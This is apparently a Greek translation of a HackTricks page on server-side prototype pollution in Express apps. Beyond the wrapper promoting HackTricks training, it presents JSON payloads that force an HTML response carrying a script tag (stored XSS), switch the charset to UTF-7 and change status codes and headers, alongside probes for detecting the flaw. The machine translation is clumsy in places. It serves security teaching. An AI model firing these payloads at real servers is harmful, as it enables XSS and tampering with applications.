# Εργαλεία για την Προτοτυποποίηση του Πρωτοκόλλου του Express

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Εξυπηρετήστε απαντήσεις XSS

**Για περισσότερες λεπτομέρειες [ανατρέξτε στην αρχική έρευνα](https://portswigger.net/research/server-side-prototype-pollution)**

### Αλλαγή του τύπου περιεχομένου JSON σε HTML

Σε μια εφαρμογή Express που χρησιμοποιεί μια **απόκριση με τύπο περιεχομένου JSON** και αντανακλά ένα JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Σε αυτές τις περιπτώσεις, δεν είναι συνήθως δυνατή η εκτέλεση XSS με τύπο περιεχομένου JSON. Ωστόσο, με την προσβασιμότητα του πρωτοτύπου μπορούμε να **παραπλανήσουμε το Express να εξυπηρετήσει μια απόκριση HTML**. Αυτή η ευπάθεια βασίζεται στην εφαρμογή της εντολής **`res.send(obj)`** και στη χρήση του body parser με τον τύπο περιεχομένου application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Με το **μολυσμένο** **`body`** και **`_body`** ιδιότητες, είναι δυνατόν να προκαλέσετε το **Express να εξυπηρετήσει τον τύπο περιεχομένου HTML** και να αντανακλά την ιδιότητα `_body`, με αποτέλεσμα την αποθηκευμένη XSS.

### Απεικόνιση UTF7

Είναι δυνατόν να κάνετε το express **να απεικονίσει περιεχόμενο UTF-7 με**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Ασφαλείς τεχνικές σάρωσης

### Κενά JSON

Το παρακάτω PP θα προσθέσει ένα επιπλέον κενό στα γνωρίσματα ενός JSON χωρίς να διακόψει τη λειτουργικότητα:
```json
{"__proto__":{"json spaces": " "}}
```
Έπειτα, ένα αντανακλασμένο JSON θα φαίνεται ως εξής:
```json
{"foo":  "bar"} -- Note the extra space
```
### Αποκαλυμμένα Κεφαλίδες

Το παρακάτω PP gadget θα κάνει τον διακομιστή να στείλει πίσω την HTTP κεφαλίδα: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Απαιτείται η εγκατάσταση του **CORS module**

### **Μέθοδος OPTIONS**

Με τον παρακάτω φορτίο, είναι δυνατό να **αποκρύψετε μια μέθοδο από μια απάντηση OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Κατάσταση**

Είναι δυνατόν να αλλάξετε τον **κωδικό κατάστασης που επιστρέφεται** χρησιμοποιώντας τον παρακάτω φορτίο PP:
```json
{"__proto__":{"status":510}}
```
### Σφάλμα

Όταν αναθέτετε σε ένα πρότυπο ένα πρωτογενές στοιχείο, όπως ένα αλφαριθμητικό, παράγεται μια λειτουργία **no-op καθώς το πρότυπο πρέπει να είναι ένα αντικείμενο**. Εάν προσπαθήσετε να αναθέσετε ένα αντικείμενο προτύπου στο ίδιο το `Object.prototype`, αυτό θα **εκτινάξει μια εξαίρεση**. Μπορούμε να χρησιμοποιήσουμε αυτές τις δύο συμπεριφορές για να **ανιχνεύσουμε εάν η προτύπωση του πρωτοτύπου ήταν επιτυχής**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Ανακλαστική Τιμή

Όταν μια εφαρμογή περιλαμβάνει ένα αντικείμενο στην απόκρισή της, δημιουργώντας ένα χαρακτηριστικό με ένα **ασυνήθιστο όνομα δίπλα στο `__proto__`**, μπορεί να είναι ενδιαφέρον. Ειδικότερα, αν **μόνο το ασυνήθιστο χαρακτηριστικό επιστρέφεται** στην απόκριση, αυτό μπορεί να υποδηλώνει την ευπάθεια της εφαρμογής:
```json
{"unusualName":"value","__proto__":"test"}
```
Επιπλέον, σε περιπτώσεις όπου χρησιμοποιείται μια βιβλιοθήκη όπως το Lodash, η ρύθμιση μιας ιδιότητας τόσο μέσω της προτύπου ρύπανσης (PP) όσο και απευθείας μέσα στο αντικείμενο προσφέρει μια άλλη διαγνωστική προσέγγιση. Εάν μια τέτοια ιδιότητα παραλείπεται από την απόκριση, υποδηλώνει ότι το Lodash επαληθεύει την ύπαρξη της ιδιότητας στον στόχο αντικείμενο πριν από τη συγχώνευση:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Διάφορα

### Επιτρέψτε τελείες

Υπάρχει μια επιλογή στο Express που σας επιτρέπει να **δημιουργείτε αντικείμενα από τις παραμέτρους του αλφαριθμητικού ερωτήματος**.\
Σίγουρα θα μπορούσατε να το χρησιμοποιήσετε σε μια αλυσίδα σφάλματος για να εκμεταλλευτείτε μια ευπάθεια **προσβολής του προτύπου**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` δημιουργεί ένα αντικείμενο στο Node.**

## Αναφορές

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
